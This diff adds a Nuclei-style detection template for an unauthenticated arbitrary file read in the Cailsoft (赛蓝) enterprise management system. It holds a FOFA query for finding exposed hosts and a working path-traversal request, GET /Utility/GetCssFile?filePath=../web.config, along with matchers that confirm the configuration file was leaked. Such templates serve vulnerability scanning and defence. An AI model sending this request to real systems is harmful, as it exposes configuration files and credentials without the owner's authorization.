@@ -1,0 +1,30 @@
+id: cailsoft-getcssfile-fileread
+
+info:
+  name: 赛蓝企业管理系统 GetCssFile 任意文件读取
+  author: qwtd
+  severity: high
+  description: 赛蓝企业管理系统 GetCssFile 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  metadata:
+    fofa-query: body="www.cailsoft.com"||body="赛蓝企业管理系统"
+  tags: 赛蓝企业管理系统
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        GET /Utility/GetCssFile?filePath=../web.config HTTP/1.1
+        Host: {{Hostname}}
+
+    max-redirects: 3
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "configuration"
+          - "configSections"
+        condition: and
+      - type: status
+        status:
+          - 200
